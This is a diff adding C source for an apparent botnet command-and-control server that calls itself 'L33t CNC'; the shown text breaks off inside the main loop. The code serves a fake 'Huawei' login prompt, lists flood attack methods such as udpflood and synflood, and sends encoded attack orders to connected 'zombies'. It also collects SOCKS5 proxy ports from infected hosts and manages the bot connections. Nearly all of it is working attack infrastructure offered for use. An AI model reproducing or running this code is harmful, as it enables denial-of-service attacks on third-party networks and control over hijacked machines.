@@ -1,0 +1,950 @@
+
+
+void *catBanner(int fd)
+{
+    util_sockprintf(fd, "        *          .MMM8&&&.            *       \r\n");
+    util_sockprintf(fd, "                  MMMM88&&&&&    .              \r\n");
+    util_sockprintf(fd, "                 MMMM88&&&&&&&                  \r\n");
+    util_sockprintf(fd, "     *           MMM88&&&&&&&&                  \r\n");
+    util_sockprintf(fd, "                 MMM88&&&&&&&&                  \r\n");
+    util_sockprintf(fd, "                 .MMM88&&&&&&.                  \r\n");
+    util_sockprintf(fd, "                   .MMM8&&&.      *             \r\n");   
+    util_sockprintf(fd, "           /\\/|_  |   __/\\                    \r\n");
+    util_sockprintf(fd, "          /    -\\    /-   ~\\  .              '\r\n");
+    util_sockprintf(fd, "          \\    = Y =T_ =   /                  \r\n");
+    util_sockprintf(fd, "           )==*(`     `) ~ \\                  \r\n");
+    util_sockprintf(fd, "          /     \\     /     \\                \r\n");
+    util_sockprintf(fd, "          |     |     ) ~   (                  \r\n");
+    util_sockprintf(fd, "         /       \\   /     ~ \\               \r\n");
+    util_sockprintf(fd, "         \\       /   \\~     ~/               \r\n");
+    util_sockprintf(fd, "  DRP_/\\_/\\__  _/_/\\_/\\__~__/_/\\_/\\_/\\_/\\_/\\_\r\n");
+    util_sockprintf(fd, "  |  |  |  | ) ) |  |  | ((  |  |  |  |  |  |    \r\n");
+    util_sockprintf(fd, "  |  |  |  |( (  |  |  |  \\\\ |  |  |  |  |  |  \r\n");
+    util_sockprintf(fd, "  |  |  |  | )_) |  |  |  |))|  |  |  |  |  |    \r\n");
+    util_sockprintf(fd, "  |  |  |  |  |  |  |  |  (/ |  |  |  |  |  |    \r\n");
+    util_sockprintf(fd, "  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |    \r\n");
+}
+
+void *userThread(void *arg) 
+{
+    pthread_detach(pthread_self());
+    
+    AdminArgs *args = (AdminArgs *)arg;
+    Credentials credentials;
+    pthread_t titlewriter_thread[1];
+    unsigned char buffer[512];
+    int fd = 0;
+    unsigned char message[512];
+    
+    util_zero(&credentials, sizeof(Credentials));
+    util_zero(&args->info, sizeof(UserInfo));
+    util_zero(titlewriter_thread, sizeof(titlewriter_thread));
+    util_zero(buffer, 512);
+    fd = args->fd;
+    util_zero(message, 512);
+    
+    sleep(1);
+    
+    do
+    {
+        util_sockprintf(fd, "Huawei HGN 1738\r\n\x1b[1;31mLogin\x1b[1;33m: \x1b[0m");
+        util_zero(buffer, 512);
+        util_zero(message, 512);
+        util_read(fd, buffer, sizeof(buffer)-1);
+        if(strlen(buffer) < 1)
+        {
+            continue;
+        }
+        strncpy(credentials.username, buffer, sizeof(credentials.username));
+        break;
+    } while(1);
+    
+    do
+    {
+        util_zero(buffer, 512);
+        util_zero(message, 512);
+        util_sockprintf(fd, "\x1b[1;31mPassword\x1b[1;33m: \x1b[0m");
+        util_read(fd, buffer, sizeof(buffer)-1);
+        if(strlen(buffer) < 1)
+        {
+            continue;
+        }
+        strncpy(credentials.password, buffer, sizeof(credentials.password));
+        break;
+    } while(1);
+    
+    printf("[ADMIN] got login {%s:%s}\r\n", credentials.username, credentials.password);
+    if (validateLogin(&credentials, &args->info)) 
+    {
+        pthread_create(&titlewriter_thread[0], &tattr, &titleThread, (void *)&fd);
+        util_sockprintf(fd, "\x1b[1A\x1b[2J\x1b[1;1HCLEARSCR\r\n");
+        catBanner(fd);
+        util_sockprintf(fd, "%s@microwave: ", args->info.username);
+
+        while (1) 
+        {
+            util_zero(buffer, 512);
+            util_zero(message, 512);
+            if(util_read(fd, buffer, sizeof(buffer)) < 1)
+            {
+                break;
+            }
+            util_trim(buffer);
+            if(strlen(buffer) < 1)
+            {
+                util_zero(buffer, sizeof(buffer));
+                util_zero(message, 512);
+                util_sockprintf(fd, "%s@microwave: ", args->info.username);
+                continue;
+            }
+            
+            printf("got buffer {%s} %ld bytes\r\n", buffer, strlen(buffer));
+            buffer[strlen(buffer)] = 0x00;
+
+            int count = 0; // split up auth
+            uint8_t **arguments = util_tokenize(buffer, strlen(buffer), &count, ' ');
+
+            if(!strcmp(arguments[0], "?")) 
+            {
+                // Handle '?' case
+            }
+            else if(!strcmp(arguments[0], "CLEAR"))
+            {
+                util_sockprintf(fd, "\x1b[1A\x1b[2J\x1b[1;1HCLEARSCR\r\n");
+                catBanner(fd);
+            }
+            else if(!strcmp(arguments[0], "HELP"))
+            {
+                catBanner(fd);
+                util_sockprintf(fd, "\x1b[202mAttack Methods:\r\n");
+                util_sockprintf(fd, "\x1b[201m udpflood <IP> <PORT> <TIME>\r\n");
+                util_sockprintf(fd, "\x1b[206m stdflood <IP> <PORT> <TIME>\r\n");
+                util_sockprintf(fd, "\x1b[201m tcpflood <IP> <PORT> <TIME>\r\n");
+                util_sockprintf(fd, "\x1b[206m synflood <IP> <PORT> <TIME>\r\n");
+                util_sockprintf(fd, "\x1b[201m gtcpflood <IP> <PORT> <TIME>\r\n");
+                util_sockprintf(fd, "\x1b[206m gudpflood <IP> <PORT> <TIME>\r\n");
+                util_sockprintf(fd, "\x1b[202mMisc Commands:\r\n");
+                util_sockprintf(fd, "\x1b[201m HELP\r\n");
+                util_sockprintf(fd, "\x1b[206m CLEAR\r\n");
+            }
+            else if(commandHandler(args, arguments, count) == 1)
+            {
+                // do something after we use l33t's command handler
+                printf("send cmd with cmd handler!\r\n");
+            }
+            else if (ddos_method_checkCommandExists(arguments[0]))
+            {
+                if (count >= 4)
+                {
+                    unsigned char *target = arguments[1];
+                    int dport = atoi(arguments[2]), duration = atoi(arguments[3]);
+
+                    if(util_isValidIp4(target) == 0)
+                    {
+                        util_sockprintf(fd, "%s is a invalid ipv4 host\r\n", target);
+                    }
+                    else if (isBlacklisted(target))
+                    {
+                        util_sockprintf(fd, "%s is a blacklisted host\r\n", target);
+                    }
+                    else if(duration > 600 || duration < 10)
+                    {
+                        util_sockprintf(fd, "%d is a invalid time 1-600\r\n", duration);
+                    }
+                    else
+                    {
+                        unsigned char target_method = ddos_method_getIdFromCommandName(arguments[0]);
+                        uint32_t target_ip_address = inet_addr(target);
+                        uint16_t target_ip_port = htons(dport);
+                        uint32_t target_duration = htonl(duration);
+                        
+                        if(ddos_start(args, target_method, target_ip_address, dport, duration) != NULL)
+                        {
+                            unsigned char command[64];
+                            util_zero(command, 64);
+                            util_cpy(command, "\x00", 1);          // tell bot its a ddos attack
+                            util_cpy(command+1, &target_method, 1);// tell bot udpgame flood aka flood 0 in enum list located in bot/attacks.h
+                            util_cpy(command+2, &target_ip_address, 4);
+                            util_cpy(command+2+4, &target_ip_port, 2);
+                            util_cpy(command+2+4+2, &target_duration, 4);
+                            size_t cmd_len = 2+4+2+4;
+                            util_sockprintf(fd, "\x1b[1;32m[%ds] commanding %d zombies to flood --> %s %s:%d\x1b[0m\r\n", duration, printBots(), arguments[0], target, dport);
+                            broadcastDetails(MAXFDS, command, cmd_len);
+                        }
+                    }
+                }
+                else
+                {
+                    util_sockprintf(fd, "[INFO] enter <method> <target> <dport> <duration>\r\n");
+                }
+            }
+            else 
+            {
+                util_sockprintf(fd, "Unknown command.\r\n");
+            }
+
+            util_sockprintf(fd, "%s@microwave: ", args->info.username);
+
+            int k;
+            for (k = 0; k < count; k++) 
+            {
+                free(arguments[k]);
+            }
+            free(arguments);
+        }
+    }
+
+    close(fd);
+    free(args);
+    pthread_detach(pthread_self());
+    pthread_exit(NULL);
+    return NULL;
+}
+
+void reuseAddr(int fd)
+{
+    int s = 1;
+    int check = setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &s, sizeof(s));
+    if (check < 0)
+    {
+        printf("Unable to re-use same addr \n");
+        exit(1);
+    }
+    else
+    {
+        printf("We can re-use the same addr \n");
+    }
+}
+
+void *adminConnection(void *vtg)
+{
+	//23.227.38.65
+    pthread_detach(pthread_self());
+    int s = 1;
+    struct sockaddr_in C2;
+    pthread_t thread;
+    socklen_t C2len = sizeof(C2);
+    C2_fd = socket(AF_INET, SOCK_STREAM, 0);
+    C2.sin_family = AF_INET;
+    C2.sin_addr.s_addr = INADDR_ANY;
+    C2.sin_port = htons(admin_port);
+    reuseAddr(C2_fd);
+    if (bind(C2_fd, (struct sockaddr *)&C2, sizeof(C2)) < 0)
+    {
+        printf("Unable to bind to socket \n");
+        exit(1);
+    }
+    if ((listen(C2_fd, 999999)) < 0)
+    {
+        printf("Failed to listen \n");
+        exit(1);
+    }
+    printf("C2 Socket started \n");
+    while (1)
+    {
+        C2len = sizeof(struct sockaddr_in);
+        util_zero(&C2, sizeof(struct sockaddr_in));
+		
+        int tmpfd = accept(C2_fd, (struct sockaddr *)&C2, &C2len);
+        if (tmpfd < 0)
+        {
+            printf("Unable to accept pending connection \n");
+        }
+		AdminArgs *user = malloc(sizeof(AdminArgs));
+        util_zero(user, sizeof(AdminArgs));
+		user->fd = tmpfd;
+        user->ip = C2.sin_addr.s_addr;
+        pthread_create(&thread, NULL, &userThread, (void *)user);
+    }
+    return NULL;
+}
+
+static void botConnection()
+{
+    struct sockaddr_in fd;
+    socklen_t socklen = sizeof(fd);
+    fcntl(Bot_fd, F_SETFL, fcntl(Bot_fd, F_GETFL, 0) | O_NONBLOCK);
+    Bot_fd = socket(AF_INET, SOCK_STREAM, 0);
+    fd.sin_family = AF_INET;
+    fd.sin_addr.s_addr = INADDR_ANY;
+    fd.sin_port = htons(bot_port);
+    int rc, on = 1;;
+    rc = ioctl(Bot_fd, FIONBIO, (char *)&on);
+    if (rc < 0)
+    {
+        perror("ioctl() failed");
+        close(Bot_fd);
+        exit(-1);
+    }
+    reuseAddr(Bot_fd);
+    if(bind(Bot_fd, (struct sockaddr *)&fd, sizeof(fd)) < 0)
+    {
+        printf("Unable to bind to socket \n");
+        exit(1);
+    }
+    if((listen(Bot_fd, 500)) < 0)
+    {
+        printf("Failed to listen \n");
+        exit(1);
+    }
+    printf("Bot Socket started \n");
+    return;
+}
+
+
+static void fdRemove(struct l33tpoll_sess_data_t *sess, size_t thefd)
+{
+    if(bots[thefd]->fd < 0) return;//theres a handler to recieve this error already
+    pthread_mutex_lock(&bots_data_lock);
+    l33tpoll_removefd(sess, bots[thefd]->fd); // removes fd which qbot never done properly
+    close(bots[thefd]->fd);
+    util_zero(bots[thefd], sizeof(BotInfo));
+    bots[thefd]->fd = -1;
+    bots[thefd]->ip = 0;
+    bots[thefd]->connected = 0;
+    bots[thefd]->dup = 0;
+    pthread_mutex_unlock(&bots_data_lock);
+}
+
+struct l33tpoll_thread_handler_data_t
+{
+    struct l33tpoll_sess_data_t *sess;// listener
+    struct l33tpoll_sess_data_t *wsess;//data process
+    struct l33tpoll_fd_data_t **fd_data;// fds set for thread
+    size_t fd_list_size;
+};
+
+void *epollListener(void *thread_workdata)
+{
+    struct l33tpoll_thread_handler_data_t *thr_data = thread_workdata;
+    size_t i = 0;
+    while(1)
+    {
+        size_t x = 0;// min for var is sess->fds_len
+        pthread_mutex_lock(&(thr_data->sess->lock));
+        int rc = l33tpoll_poll(thr_data->sess);
+        pthread_mutex_unlock(&(thr_data->sess->lock));
+        if(rc == 0) continue;
+        if(thr_data->sess->fds_len == 0) 
+        { 
+            //printf("[botlistener]ERRPR POLLLLL\r\n");
+            continue; 
+        }// what are we listening on?
+        if(rc > 0)
+        {
+            for (i = 0; i < thr_data->fd_list_size; i++) 
+            {
+                if(thr_data->fd_data[i]->fd.revents == 0) continue;// nothing happend yet.////
+                if (((!(thr_data->fd_data[i]->fd.revents & POLLIN)) && (!(thr_data->fd_data[i]->fd.revents & POLLPRI))) || (thr_data->fd_data[i]->fd.fd < 1)) 
+                {
+                    printf("[botlistener] Server Error \r\n");
+                    pthread_exit(NULL);
+                    return NULL;
+                }
+                else 
+                {
+                    struct sockaddr_in addr;
+                    socklen_t in_len = 0;
+                    size_t ipIndex = 0;
+                    int infd = -1; 
+                    
+                    in_len = sizeof(struct sockaddr_in);
+                    util_zero(&addr, in_len);
+                    
+                    infd = accept(thr_data->fd_data[i]->fd.fd, (struct sockaddr * )&addr, &in_len);
+                    if (infd == -1) 
+                    {
+                        if ((errno == EAGAIN) || (errno == EWOULDBLOCK))
+                        {
+                            printf("[botlistener] errno says blocking error!\r\n. Lets accept some more!\r\n");
+                            break;
+                        }
+                        else 
+                        {
+                            printf("[botlistener] errno says poll error %d!\r\n. Lets accept some more!\r\n", errno);
+                            continue;
+                            break;
+                        }
+                    }
+                    
+                    pthread_mutex_lock(&bots_data_lock);
+                    util_zero(bots[infd],sizeof(BotInfo));
+                    bots[infd]->ip = addr.sin_addr.s_addr;
+
+                    #ifdef DEBUG
+                    printf("Incoming connection from %s \n", inet_ntoa(addr.sin_addr));
+                    #endif
+
+                    if(bots[infd]->ip != 0x00)
+                    {// inbound connection from unidentified source
+                        ssize_t duppos = -1;
+                        //check if we know, him aka UFO
+                        for (ipIndex = 0; ipIndex < MAXFDS; ipIndex++) 
+                        {
+							if(ipIndex == infd) continue;
+                            if(bots[ipIndex]->fd == bots[infd]->fd  || bots[ipIndex]->fd == Bot_fd) continue;
+                            //filter dups
+                            if ((bots[ipIndex]->connected == 0))
+                            {
+                                // we shouldnt do these things
+                                continue;
+                            }
+                            
+                            // checks ip match to new buddy
+                            if (bots[ipIndex]->ip == bots[infd]->ip) 
+                            {// hes no longer a new budy
+                                unsigned char snd[] = {0x01, (unsigned char)'\n'};
+                                int flags = fcntl(bots[ipIndex]->fd, F_GETFL, 0);
+								if (flags == -1) {
+									// handle error
+								}
+								flags = flags & ~O_NONBLOCK; // clear O_NONBLOCK flag
+								if (fcntl(bots[ipIndex]->fd, F_SETFL, flags) == -1) {
+									// handle error
+								}
+								send_all(bots[ipIndex]->fd, (void *)&snd, 2, MSG_NOSIGNAL);
+								fcntl(bots[ipIndex]->fd, F_SETFL, fcntl(bots[ipIndex]->fd, F_GETFL, 0) | O_NONBLOCK);
+								
+                                bots[ipIndex]->dup = 1;
+                                
+                                duppos = ipIndex;
+                                break;
+                            }
+                            
+                            //continue we dont know him
+                            continue;
+                        }
+                        
+                        if(duppos != -1)
+                        {
+                            if(bots[duppos]->dup == 1)
+                            {// shes a duplicate bot jiffy
+                                // do DUP print
+                            }
+                            else
+                            {// cant identify him hes new buffy
+                                // do NEW print
+                            }
+                        }
+                    }
+                    else
+                    {//localhost connection
+                        bots[infd]->dup = 0;// set ourself as not dup 
+                    }
+
+                    fcntl(infd, F_SETFL, fcntl(infd, F_GETFL, 0) | O_NONBLOCK);
+                    
+                    bots[infd]->fd = infd;
+                    bots[infd]->connected = 1;
+                    pthread_mutex_unlock(&bots_data_lock);
+                    l33tpoll_addfd(thr_data->wsess, bots[infd]->fd, POLLIN);
+                    break;
+                }
+            }
+        }
+        else if (rc == 0)
+        {
+            printf("   TIMEOUT botlistener  \r\n");
+            //release our threads
+            continue;
+        }
+        else
+        {
+            printf("[botlistener] ERROR! %d\r\n", errno);
+            //release our threads
+            //usleep(150000);
+            continue;
+        }
+    }
+    pthread_exit(NULL);
+    return NULL;
+}
+
+ssize_t _cnc_read_(const int sockfd, void *buf, const size_t nbytes) 
+{
+    ssize_t n = 0;
+    while(1)
+    {
+        if(nbytes-n < 1+1) break;
+        #ifdef _WIN32
+        ssize_t ret = 0;
+        ret = recv(sockfd, buf+n, 1, 0);
+        if(ret != 1) 
+        {
+            if(ret == 0) return 0;
+            break;
+        }
+        n += ret; 
+        #else
+        ssize_t ret = 0;
+        ret = recv(sockfd, buf+n, 1, MSG_NOSIGNAL);
+        if(ret != 1) 
+        {
+            if(ret == 0) return 0;
+            if(errno != EAGAIN && errno != EWOULDBLOCK) return 0;
+            break;
+        }
+        n += ret; 
+        #endif
+        unsigned char *bbuf = buf+(n-1);
+        if((*bbuf) == '\n') break;
+        continue;
+    }
+    return n;
+}
+
+void *epollWorker(void *thread_workdata)
+{
+    struct l33tpoll_thread_handler_data_t *thr_data = thread_workdata;
+    size_t i = 0;
+    for (i = 0; i < thr_data->fd_list_size; i++) 
+    {
+        if(thr_data->fd_data[i] == NULL) break;
+        int thefd = thr_data->fd_data[i]->fd.fd;
+        unsigned char done = 0;
+        
+        if(thr_data->fd_data[i]->fd.revents == 0)
+        {
+            continue;
+        }
+        else if (((!(thr_data->fd_data[i]->fd.revents & POLLIN)) && (!(thr_data->fd_data[i]->fd.revents & POLLPRI))) || (thr_data->fd_data[i]->fd.fd < 1)) 
+        {
+            done = 1;
+        }
+        else if(thr_data->fd_data[i]->fd.revents != 0)
+        {
+            pthread_mutex_lock(&bots_data_lock);
+            BotInfo *client = (bots[thefd]);
+            client->connected = 1;
+
+            ssize_t count = 0;
+            unsigned char buffer[2048];
+            util_zero(buffer, sizeof(buffer));
+
+            if((count = _cnc_read_(thefd, buffer, sizeof(buffer) - 1)) > 0) 
+            {
+                unsigned char *buf = buffer;
+                // check for ping
+                if(count == 1 && *buf == '\n') {// ping
+                    util_zero(buffer, sizeof(buffer));
+                    continue;
+                }
+                if(count == 2 && *buf == '\r' && *(buf+1) == '\n')// pingg
+                {
+                    util_zero(buffer, sizeof(buffer));
+                    continue;
+                }
+				
+				ssize_t x = 0;
+				for(x = 0; x < count; x++)
+				{
+					if(buf[x] == '\r' || buf[x] == '\n')
+					{
+						buf[x] = 0;
+					}
+				}
+                
+                if(buf[0] == '\x55')
+                {
+                    start_rep(thefd);
+                    int name_len = strlen(buf+1);
+                    unsigned char name[32];
+                    util_zero(name, sizeof(name));
+                    if(name_len >= 32)
+                    {
+                        name_len = 31;
+                    }
+					memset(client->tag, 0x00, sizeof(client->tag));
+                    strncpy(name, buf+1, sizeof(name));
+                    strncpy(client->tag, name, sizeof(client->tag));
+                    printf("Client %s connected ~> %d.%d.%d.%d\r\n", client->tag, client->ip & 0xff, (client->ip >> 8) & 0xff, (client->ip >> 16) & 0xff, (client->ip >> 24) & 0xff);
+                }
+                
+                if(buf[0] == '\x53')
+                {
+                    uint16_t _port = 0;
+                    util_cpy(&_port, buf+1, sizeof(uint16_t));
+                    uint16_t port = ntohs(_port);
+                    fprintf(stdout, "\x1b[1;96mGot Possible Socks5 proxy server ~> {%d.%d.%d.%d:%d}\r\n", bots[thefd]->ip & 0xff, (bots[thefd]->ip >> 8) & 0xff, (bots[thefd]->ip >> 16) & 0xff, (bots[thefd]->ip >> 24) & 0xff, port);
+                    save_socks5_proxy(bots[thefd]->ip, port);
+                }
+                
+                if (strcmp(buf, "PING") == 0) 
+                {// Basic IRC-like ping/pong challenge/response to see if server is alive
+                    send(thefd, "PONG\n", 5, MSG_NOSIGNAL);
+                }
+                
+                if (strcmp(buf, "PONG") == 0) 
+                {
+                    
+                }
+            }
+            
+            if (count == 0) 
+            {
+                done = 1;
+            }
+            
+            pthread_mutex_unlock(&bots_data_lock);
+        }
+        if (done) 
+        {
+            fdRemove(thr_data->wsess, thefd);
+            break;
+        }
+        continue;
+    }
+    pthread_exit(NULL);
+    return NULL;
+}
+
+unsigned char ddonow()
+{
+    return (unsigned char)1;
+}
+
+void *listen_client_parent(void *sess_data)
+{
+    struct l33tpoll_thread_handler_data_t *thr_data = sess_data;
+    
+    pthread_detach(pthread_self());
+    
+    size_t default_threads = 10;
+    while(ddonow() == 1)
+    {
+        usleep(5000);
+        //quickly set variables t
+        void *free_ptr = NULL;
+        uint8_t next_fd_pos = 0;// max for var is sess->fds_len
+        struct l33tpoll_thread_handler_data_t *new_thr_data = malloc(1 * sizeof(struct l33tpoll_thread_handler_data_t));
+        
+        util_zero(new_thr_data, sizeof(new_thr_data));
+        
+        new_thr_data->sess = thr_data->sess;
+        new_thr_data->wsess = thr_data->wsess;
+        new_thr_data->fd_data = thr_data->sess->fds;
+        new_thr_data->fd_list_size = thr_data->sess->fds_len;
+        
+        epollListener(new_thr_data);
+        
+        free(new_thr_data);
+        new_thr_data = NULL;
+        continue;
+    }
+    
+    pthread_exit(NULL);
+    return NULL;
+}
+
+void *process_client_parent(void *sess_data)
+{
+    struct l33tpoll_thread_handler_data_t *thr_data = sess_data;
+    
+    pthread_detach(pthread_self());
+    
+    unsigned char isListener = 0;
+    size_t default_threads = 100;
+    pthread_t *listener_threads = malloc(default_threads * sizeof(pthread_t));
+    util_zero(listener_threads, sizeof(listener_threads));
+    
+    size_t sleep_counter = 0;
+    
+    while(ddonow() == 1)
+    {
+        usleep(12000);
+        pthread_mutex_lock(&bots_data_lock);
+        size_t x;
+        for (x = 0; x < MAXFDS; x++) 
+        {
+            if(bots[x]->dup == 1)
+            {
+                fdRemove(thr_data->wsess, x);
+                util_zero(bots[x], sizeof(BotInfo));
+                bots[x]->connected = 0;
+            }
+        }
+        pthread_mutex_unlock(&bots_data_lock);
+        
+        void *free_ptr = NULL;
+        size_t thread_cycles = default_threads;// min for var is sess->fds_len
+        
+        DEBUG_PTHREAD_DEADLOCK();
+        pthread_mutex_lock(&(thr_data->wsess->lock));
+        
+        int rc = l33tpoll_poll(thr_data->wsess);
+        
+        if(rc < 1)
+        {
+            DEBUG_PTHREAD_UNDEADLOCK();
+            pthread_mutex_unlock(&(thr_data->wsess->lock));
+            continue;
+        }
+        if(thr_data->wsess->fds_len == 0) 
+        { 
+            DEBUG_PTHREAD_UNDEADLOCK();
+            pthread_mutex_unlock(&(thr_data->wsess->lock));
+            printf("[botlistener] ERRPR POLLLLL\r\n");
+            continue; 
+        }
+        if(rc > 0)
+        {
+            uint32_t next_fd_pos = 0;// max for var is sess->fds_len
+            // hello
+            size_t per_thread = 1, per_thread_remainder = 0;
+            //i was writing them both at the same time get until if/else block over
+            // we have multiple fds lets run threads for certain ones
+            struct l33tpoll_thread_handler_data_t *new_thr_data = NULL;
+            if(thread_cycles >= thr_data->wsess->fds_len)
+            {
+                // now we need to cutoff on last thread
+                thread_cycles = thr_data->wsess->fds_len;
+                per_thread  = 1;
+            }
+            else
+            {//
+                per_thread = (thr_data->wsess->fds_len / thread_cycles); //120/80           = 1
+                per_thread_remainder = (thr_data->wsess->fds_len % thread_cycles); //120/80 = 5
+                
+                if(per_thread > thread_cycles/2)
+                {
+                    thread_cycles = per_thread/2;
+                    if(thread_cycles >= thr_data->wsess->fds_len)
+                    {
+                        // now we need to cutoff on last thread
+                        thread_cycles = thr_data->wsess->fds_len;
+                        per_thread  = 1;
+                    }
+                    else
+                    {//
+                        per_thread = (thr_data->wsess->fds_len / thread_cycles); //120/80           = 1
+                        per_thread_remainder = (thr_data->wsess->fds_len % thread_cycles); //120/80 = 5
+                    }
+                }
+            }
+            
+            new_thr_data = malloc(thread_cycles*(sizeof(struct l33tpoll_thread_handler_data_t)));
+            for(x = 0; x < thread_cycles; x++)
+            {
+                //lets make a unique list for each thread_cycles
+                util_zero(&(new_thr_data[x]), sizeof(struct l33tpoll_thread_handler_data_t));
+                new_thr_data[x].sess = thr_data->sess;
+                new_thr_data[x].wsess = thr_data->wsess;
+                // unique list generator base per _thread
+                new_thr_data[x].fd_list_size = per_thread;
+                new_thr_data[x].fd_data = malloc((per_thread+1)*sizeof(struct l33tpoll_fd_data_t *));
+                util_zero(new_thr_data[x].fd_data, sizeof(new_thr_data[x].fd_data));
+                size_t j = 0;
+                for(j = 0; j < per_thread; j++)
+                {
+                    //DEBUG_PTHREAD_DEADLOCK();
+                    //pthread_mutex_lock(&(thr_data->wsess->fds[next_fd_pos]->lock));
+                    new_thr_data[x].fd_data[j] = thr_data->wsess->fds[next_fd_pos];
+                    next_fd_pos += 1;// given FD;//
+                    if(next_fd_pos >= thr_data->wsess->fds_len)
+                    {
+                        //printf("[botworker] No remainder putting l33tpoll_sessions into thread_cycles x:%d j:%d next_fd_pos:%d\r\n", x, j, next_fd_pos);
+                        break;
+                    }
+                }
+                
+                //add remainder ones now
+                
+                if(thread_cycles-1 == x)
+                {
+                    if(per_thread_remainder != 0)
+                    {
+                        size_t add_bsize = (thr_data->wsess->fds_len-next_fd_pos)-1;
+                        //printf("[botworker] adding remainder ([%ld perthr]  [%ld add_bsize] [%ld newsize]) connections from float aversion\r\n", per_thread, add_bsize,per_thread+add_bsize);
+                        if(add_bsize > 0)
+                        {
+                            new_thr_data[x].fd_data = realloc(new_thr_data[x].fd_data, ((per_thread+add_bsize+1)*sizeof(struct l33tpoll_fd_data_t *)));
+                        }
+                        for(j = per_thread; j < per_thread+add_bsize; j++)
+                        {
+                            new_thr_data[x].fd_data[j] = thr_data->wsess->fds[next_fd_pos];
+                            next_fd_pos += 1;// given FD;//
+                            if(next_fd_pos >= thr_data->wsess->fds_len)
+                            {
+                                break;
+                            }
+                        }
+                        new_thr_data[x].fd_list_size = add_bsize;
+                    }
+                }
+                
+                continue;
+            }
+            
+            for(x = 0; x < thread_cycles; x++)
+            {
+                pthread_create(&listener_threads[x], &tattr, &epollWorker, (void *)&(new_thr_data[x]));
+                continue;
+            }
+            
+            DEBUG_PTHREAD_UNDEADLOCK();
+            pthread_mutex_unlock(&(thr_data->wsess->lock));
+            
+            for(x = 0; x < thread_cycles; x++)
+            {
+                pthread_join(listener_threads[x], NULL);
+                continue;
+            }
+            
+            for(x = 0; x < thread_cycles; x++)
+            {
+                free(new_thr_data[x].fd_data);
+                continue;
+            }
+            
+            free(new_thr_data);
+            new_thr_data = NULL;
+            //printf("[botworker] handled data for %d clients on %d threads\r\n", next_fd_pos, thread_cycles);
+        }
+        else if (rc == 0)
+        {
+            printf("   TIMEOUT botworker   \r\n");
+            //usleep(55000);
+            DEBUG_PTHREAD_UNDEADLOCK();
+            pthread_mutex_unlock(&(thr_data->wsess->lock));
+            continue;
+        }
+        else
+        {
+            printf("[botworker] ERROR! %d\r\n", errno);
+            DEBUG_PTHREAD_UNDEADLOCK();
+            pthread_mutex_unlock(&(thr_data->wsess->lock));
+            continue;
+        }
+        
+        continue;
+    }
+    
+    pthread_exit(NULL);
+    return NULL;
+}
+
+void bothdlr_start(void)
+{
+    // init bots
+    load_bots();
+    botConnection();
+    struct l33tpoll_sess_data_t *new_l_l33tpoll_session = l33tpoll_create(12000);
+    struct l33tpoll_sess_data_t *new_h_l33tpoll_session = l33tpoll_create(6000);
+    struct l33tpoll_thread_handler_data_t *main_thread_data = malloc(sizeof(struct l33tpoll_thread_handler_data_t));
+    util_zero(main_thread_data, sizeof(struct l33tpoll_thread_handler_data_t));
+    main_thread_data->sess = new_l_l33tpoll_session;
+    main_thread_data->wsess = new_h_l33tpoll_session;
+    main_thread_data->fd_data = NULL;
+    main_thread_data->fd_list_size = 0;
+    if(new_l_l33tpoll_session != NULL && new_h_l33tpoll_session != NULL)
+    {
+        printf("[bothdlr] l33tpoll.c API support enabled [+]\r\n");
+        l33tpoll_addfd(new_l_l33tpoll_session, Bot_fd, POLLIN);
+        
+        pthread_t bot_threads[2];// 2 daddyl33t threads
+        util_zero(bot_threads, sizeof(bot_threads));
+        {
+            pthread_create(&bot_threads[0], &tattr, &listen_client_parent, (void *)main_thread_data);
+        }
+        {    
+            pthread_create(&bot_threads[1], &tattr, &process_client_parent, (void *)main_thread_data);
+            //process_client_parent(main_thread_data);
+        }
+        
+        printf("[bothdlr] Module Enabled [+]\r\n");
+        return;
+    }
+    
+    if(new_l_l33tpoll_session != NULL)
+    {
+        free(new_l_l33tpoll_session);
+        new_l_l33tpoll_session = NULL;
+    }
+    
+    if(new_h_l33tpoll_session != NULL)
+    {
+        free(new_h_l33tpoll_session);
+        new_h_l33tpoll_session = NULL;
+    }
+    
+    printf("[bothdlr] Error! NO l33tpoll.c for client Recv [X] exiting, try to run as root\r\n");
+    
+    
+    exit(0);
+    return;
+}
+
+void sendPing(void)
+{
+    pthread_mutex_lock(&bots_data_lock);
+    size_t g = 0;
+    for (g = 0; g < MAXFDS; g++)
+    {
+        if (bots[g]->connected == 1)
+        {
+			int flags = fcntl(bots[g]->fd, F_GETFL, 0);
+			if (flags == -1) {
+				// handle error
+			}
+			flags = flags & ~O_NONBLOCK; // clear O_NONBLOCK flag
+			if (fcntl(bots[g]->fd, F_SETFL, flags) == -1) {
+				// handle error
+			}
+			send_all(bots[g]->fd, "\n", 1, MSG_NOSIGNAL);
+			send_all(bots[g]->fd, "\r\n", 2, MSG_NOSIGNAL);
+			fcntl(bots[g]->fd, F_SETFL, fcntl(bots[g]->fd, F_GETFL, 0) | O_NONBLOCK);
+        }
+    }
+    pthread_mutex_unlock(&bots_data_lock);
+}
+
+int main(int argc, char *argv[])
+{
+	proxy_list_fp = fopen("socks5_result.txt", "a+");
+    if(proxy_list_fp == NULL)
+    {
+        fprintf(stderr, "Error opening socks5_result.txt\r\n");
+        exit(EXIT_FAILURE);
+    }
+    printf("[MAIN] L33t CNC Started\r\n");
+    // start internal pthread library
+    init_pthread_daddyl33t();
+    
+    bothdlr_start();
+     
+    printf("[MAIN] Starting Admin Setup\r\n[MAIN] initalizing DDOS methods\r\n");
+    ddos_method_addCommand("udpflood", 0x01);
+    ddos_method_addCommand("stdflood", 0x02);
+    ddos_method_addCommand("tcpflood", 0x03);
+    ddos_method_addCommand("synflood", 0x04);
+    ddos_method_addCommand("gtcpflood", 0x05);
+    ddos_method_addCommand("gudpflood", 0x06);
+    command_init();
+
+    UtilCreateServer();
+    int j;
+    int tc = 50;
+    pthread_t util_thrs[tc];
+    pthread_attr_t attr;
+    pthread_attr_init(&attr);
+    pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_DETACHED);  // indicates that the created threads should be detached (they cannot be joined) and resources terminated when done running
+    for(j = 0; j < tc; j++)
+    {
+        pthread_create(&util_thrs[j], &attr, &UtilEventLoop, (void*) NULL);
+        pthread_detach(util_thrs[j]);
+    }
+    
+    printf("[MAIN] Starting Admin Listener\r\n");
+    pthread_t connection_threads;
+    pthread_create(&connection_threads, &tattr, &adminConnection, (void *)NULL);
+    printf("[MAIN] Threading started on C2 socket \r\n");
+    
+    printf("[MAIN] Pinging Clients every 100s\r\n");
+    while (TRUE)
+    {
